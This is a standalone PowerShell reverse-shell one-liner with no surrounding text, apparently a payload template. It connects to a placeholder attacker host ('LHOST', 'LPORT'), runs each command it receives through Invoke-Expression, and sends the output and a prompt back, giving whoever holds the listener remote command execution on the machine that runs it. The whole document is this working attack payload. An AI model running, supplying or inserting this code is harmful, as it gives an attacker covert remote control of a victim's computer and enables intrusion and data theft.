$c = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$o = (iex $d 2>&1 | Out-String );$oo = $o + "PS " + (pwd).Path + "> ";$sb = ([text.encoding]::ASCII).GetBytes($oo);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()